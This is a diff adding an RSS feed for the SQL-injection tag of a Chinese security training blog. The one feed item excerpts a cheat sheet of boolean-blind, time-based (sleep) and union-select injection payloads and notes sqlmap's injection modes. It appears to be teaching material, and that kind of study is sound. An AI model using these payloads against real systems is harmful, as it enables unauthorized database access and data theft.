@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>sql_inject on SecTrain安全博客</title>
+    <link>https://vul-hunters.gitee.io/hunter-blogs/tags/sql_inject/</link>
+    <description>Recent content in sql_inject on SecTrain安全博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Mon, 27 Mar 2017 11:39:39 +0800</lastBuildDate><atom:link href="https://vul-hunters.gitee.io/hunter-blogs/tags/sql_inject/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SQL注入</title>
+      <link>https://vul-hunters.gitee.io/hunter-blogs/posts/sql_inject/</link>
+      <pubDate>Mon, 27 Mar 2017 11:39:39 +0800</pubDate>
+      
+      <guid>https://vul-hunters.gitee.io/hunter-blogs/posts/sql_inject/</guid>
+      <description>SQL注入 手工党 boolean型盲注 &#39; -- &#39; or &#39;1&#39;=&#39;1 id=2 and substring(username,1,1)=&#39;y&#39; and &#39;1&#39;=&#39;1 id=2 and ascii(substring(username,1,1))=65 and &#39;1&#39;=&#39;1 id=2 and length(usernam)=5 and &#39;1&#39;=&#39;1 时间盲注 id=2 and if(version() like &#39;5%&#39;,sleep(100),&#39;false&#39;))-- union联合查询 #union联合查询时，查询列数要一致 union select 1,1,1-- union select version(),1,1-- 工具党 sqlmap sqlmap支持五种不同的注入模式  基于Boolean型的盲注 基于时间的盲注 联合查询注入 基于报错注入 堆查询注入  </description>
+    </item>
+    
+  </channel>
+</rss>
